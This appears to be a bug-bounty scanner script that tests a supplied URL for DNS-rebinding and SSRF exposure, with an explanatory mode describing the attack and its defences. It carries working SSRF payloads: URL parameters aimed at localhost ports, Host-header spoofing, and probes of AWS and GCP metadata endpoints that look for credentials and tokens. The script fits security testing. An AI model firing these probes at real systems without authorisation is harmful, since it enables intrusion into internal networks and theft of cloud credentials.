#!/usr/bin/env python3
"""
dns_rebinding_tester.py — DNS rebinding attack tester.

Tests if the target is vulnerable to DNS rebinding attacks by attempting
to access internal resources through controlled DNS responses.

DNS rebinding allows attackers to bypass Same-Origin Policy by:
1. Serving a domain that initially resolves to attacker's IP
2. After page load, changing DNS to resolve to internal/victim IP
3. JavaScript can now access internal resources

Usage:
  python3 tools/dns_rebinding_tester.py --url https://target.com [--internal 192.168.1.1]
  python3 tools/dns_rebinding_tester.py --url https://target.com --test-mode
"""

import argparse
import json
import sys
import urllib.request
import urllib.error
import urllib.parse
import socket

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

FINDINGS = []

# Common internal IP ranges to test
INTERNAL_IPS = [
    "127.0.0.1",
    "127.0.0.2",
    "localhost",
    "0.0.0.0",
    "[::]",
    "0000:0000:0000:0000:0000:0000:0000:0001",
]

# Common internal ports to probe
INTERNAL_PORTS = [22, 80, 443, 3000, 3306, 5432, 6379, 8080, 8443, 9200, 27017]


def _add_finding(severity, title, detail, evidence=""):
    f = {"severity": severity, "title": title, "detail": detail, "evidence": evidence}
    FINDINGS.append(f)
    color = RED if severity == "CRITICAL" else YELLOW if severity == "HIGH" else CYAN
    print(f"{color}[{severity}]{RESET} {title}")
    if detail:
        print(f"  {DIM}{detail}{RESET}")
    if evidence:
        print(f"  {BLUE}Evidence: {evidence}{RESET}")


def _request(url, timeout=10):
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BugBountyScanner/1.0)"}
    try:
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError as e:
        return 0, {}, str(e)
    except Exception as e:
        return 0, {}, str(e)


def test_localhost_bypass(target_url):
    """Test if application allows localhost/127.0.0.1 in URLs"""
    print(f"\n{BOLD}[1/4] Testing localhost bypass...{RESET}")

    parsed = urllib.parse.urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Common URL parameters that might accept URLs
    test_params = [
        "?url=http://127.0.0.1",
        "?redirect=http://localhost",
        "?callback=http://127.0.0.1:8080",
        "?next=http://localhost:3000",
        "?return_url=http://127.0.0.1",
        "?image_url=http://localhost/admin",
        "?proxy=http://127.0.0.1:6379",
    ]

    for param in test_params:
        test_url = base_url + param
        status, headers, body = _request(test_url)

        if status in [200, 301, 302]:
            # Check if localhost was accessed or reflected
            if "localhost" in body or "127.0.0.1" in body:
                _add_finding("HIGH",
                           "Localhost/internal IP reflection detected",
                           f"Application reflects internal addresses, possible DNS rebinding vector",
                           f"Param: {param}, Status: {status}")
            elif status == 200:
                print(f"  {YELLOW}[CHECK] {param} → {status} (manual verification needed){RESET}")


def test_host_header_rebinding(target_url):
    """Test if Host header can be set to internal IPs"""
    print(f"\n{BOLD}[2/4] Testing Host header manipulation...{RESET}")

    parsed = urllib.parse.urlparse(target_url)

    for internal_ip in INTERNAL_IPS[:3]:  # Test a few
        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; BugBountyScanner/1.0)",
            "Host": internal_ip
        }

        try:
            req = urllib.request.Request(target_url, headers=headers)
            with urllib.request.urlopen(req, timeout=5) as r:
                status = r.status
                body = r.read().decode("utf-8", errors="replace")

                if status == 200 and len(body) > 100:
                    _add_finding("MEDIUM",
                               f"Host header accepts internal IP: {internal_ip}",
                               "Application responds to internal IP in Host header",
                               f"Host: {internal_ip}, Status: {status}")
        except Exception:
            pass


def test_dns_pinning_bypass(target_url):
    """Test for DNS pinning vulnerabilities"""
    print(f"\n{BOLD}[3/4] Testing DNS pinning...{RESET}")

    parsed = urllib.parse.urlparse(target_url)
    hostname = parsed.netloc.split(":")[0]

    # Check if hostname resolves to multiple IPs
    try:
        addr_info = socket.getaddrinfo(hostname, None)
        ips = list(set([info[4][0] for info in addr_info]))

        if len(ips) > 1:
            print(f"  {CYAN}[INFO] Hostname resolves to {len(ips)} IPs: {ips}{RESET}")
            _add_finding("MEDIUM",
                       "Multiple IP resolution (Round-robin DNS)",
                       "Hostname resolves to multiple IPs - potential DNS rebinding vector",
                       f"IPs: {ips}")
        else:
            print(f"{GREEN}Single IP resolution: {ips[0]}{RESET}")

    except socket.gaierror as e:
        print(f"{YELLOW}[WARNING] Could not resolve hostname: {e}{RESET}")


def test_internal_service_probing(target_url):
    """Test if application can be used to probe internal services"""
    print(f"\n{BOLD}[4/4] Testing internal service probing...{RESET}")

    parsed = urllib.parse.urlparse(target_url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Try common SSRF payloads that would indicate internal access
    ssrf_probes = [
        "?url=http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "?url=http://metadata.google.internal/",  # GCP metadata
        "?url=http://[::ffff:127.0.0.1]/",  # IPv6 localhost
        "?url=http://127.1/",  # Decimal notation
        "?url=http://0x7f.0x0.0x0.0x1/",  # Hex notation
    ]

    for probe in ssrf_probes[:3]:  # Test a few
        test_url = base_url + probe
        status, headers, body = _request(test_url, timeout=5)

        if status == 200 and len(body) > 100:
            # Check for metadata-like content
            if any(keyword in body.lower() for keyword in ["ami-", "instance-", "credentials", "token"]):
                _add_finding("CRITICAL",
                           "Cloud metadata accessible via SSRF",
                           "Application can access cloud metadata endpoints - DNS rebinding possible",
                           f"Probe: {probe}, Status: {status}")
            else:
                print(f"  {YELLOW}[CHECK] {probe} → {status} ({len(body)} bytes){RESET}")


def test_mode():
    """Educational test mode - explains DNS rebinding"""
    print(f"\n{BOLD}DNS Rebinding Attack - Test Mode{RESET}\n")

    print(f"{CYAN}What is DNS Rebinding?{RESET}")
    print("DNS rebinding bypasses Same-Origin Policy by changing DNS resolution mid-session:\n")

    print(f"{BOLD}Attack Flow:{RESET}")
    print("1. Attacker hosts evil.com with short TTL (0-5 seconds)")
    print("2. Victim visits http://evil.com/")
    print("3. evil.com initially resolves to attacker's server (1.2.3.4)")
    print("4. Attacker serves JavaScript that makes repeated requests")
    print("5. DNS changes to resolve to victim's internal IP (192.168.1.1)")
    print("6. JavaScript now makes requests to 192.168.1.1 as 'evil.com'")
    print("7. Same-Origin Policy allows this because hostname hasn't changed!\n")

    print(f"{BOLD}Impact:{RESET}")
    print("- Access internal services (databases, admin panels)")
    print("- Bypass firewall rules")
    print("- Read internal APIs/services")
    print("- Pivot to internal network\n")

    print(f"{BOLD}Prevention:{RESET}")
    print("- Validate Host header against allowlist")
    print("- Block internal IP ranges (RFC 1918)")
    print("- Implement DNS pinning")
    print("- Use CORS properly")
    print("- Check for private IPs in all URL parameters\n")

    print(f"{BOLD}Real-world Example:{RESET}")
    print("Rebinder service: https://lock.cmpxchg8b.com/rebinder.html")
    print("Tool: singularity (https://github.com/nccgroup/singularity)")


def main():
    parser = argparse.ArgumentParser(description="DNS rebinding attack tester")
    parser.add_argument("--url", help="Target URL")
    parser.add_argument("--internal", help="Specific internal IP to test")
    parser.add_argument("--test-mode", action="store_true", help="Educational mode - explain DNS rebinding")
    parser.add_argument("--json", dest="json_out", action="store_true", help="JSON output")
    args = parser.parse_args()

    if args.test_mode:
        test_mode()
        return

    if not args.url:
        print(f"{RED}[ERROR] --url required (or use --test-mode for educational info){RESET}")
        sys.exit(1)

    print(f"\n{BOLD}DNS Rebinding Tester{RESET}")
    print(f"Target: {args.url}\n")

    print(f"{YELLOW}[WARNING] This is a basic tester. Use specialized tools for comprehensive testing:{RESET}")
    print(f"  - Singularity: https://github.com/nccgroup/singularity")
    print(f"  - Rebinder: https://lock.cmpxchg8b.com/rebinder.html\n")

    # Run tests
    test_localhost_bypass(args.url)
    test_host_header_rebinding(args.url)
    test_dns_pinning_bypass(args.url)
    test_internal_service_probing(args.url)

    if args.json_out:
        print(json.dumps({"findings": FINDINGS}, indent=2))
    else:
        print(f"\n{BOLD}Summary: {len(FINDINGS)} finding(s){RESET}")
        if not FINDINGS:
            print(f"{GREEN}No obvious DNS rebinding vectors detected.{RESET}")
        else:
            print(f"{YELLOW}Manual testing recommended with Singularity or custom rebinding setup{RESET}")


if __name__ == "__main__":
    main()
